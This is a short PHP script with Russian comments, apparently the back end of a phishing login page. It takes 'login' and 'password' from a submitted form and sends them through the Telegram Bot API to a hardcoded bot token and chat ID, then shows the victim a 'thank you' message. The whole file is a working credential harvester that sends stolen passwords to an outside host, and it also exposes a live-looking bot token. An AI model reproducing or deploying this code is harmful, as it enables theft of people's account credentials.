<?php

/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

//Переменная $name,$phone, $mail получает данные при помощи метода POST из формы
$login = $_POST['login'];
$password = $_POST['password'];

//в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "1333458185:AAFlY76FG89c9Di23fhHm31L63GGT_U0vwY";

//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-489788663";

//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  'Логин: ' => $login,
  'Пароль: ' => $password,
);

//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  echo "Спасибо";
} else {
  echo "Error";
}
?>